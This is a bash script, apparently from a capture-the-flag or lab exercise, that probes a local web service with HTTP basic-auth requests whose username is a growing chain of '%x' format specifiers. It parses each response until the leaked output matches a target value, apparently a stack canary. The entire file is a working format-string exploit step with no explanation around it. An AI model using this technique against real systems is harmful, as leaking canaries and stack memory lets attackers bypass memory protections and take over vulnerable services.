#!/bin/bash

string="%x"

canaryCanditate=$(curl -v -u "$string":password 127.0.0.1:8421 2>&1 |  tail -n 6 | head -n 1 | awk 'NF>1{print $NF}');
canaryCanditate=${canaryCanditate%\"*}

while [ "$1" != "$canaryCanditate" ]
do
    echo -e "found '${canaryCanditate}' (searching for '$1') ";
    
    string="%x $string";
    canaryCanditate=$(timeout 10 curl -v -u "$string":password 127.0.0.1:8421 2>&1 | tail -n 6 | head -n 1 | awk 'NF>1{print $NF}');

    echo -e "\n";
    canaryCanditate=${canaryCanditate%\"*}
done

echo -e "\nFound $canaryCanditate\nGiven username: $string"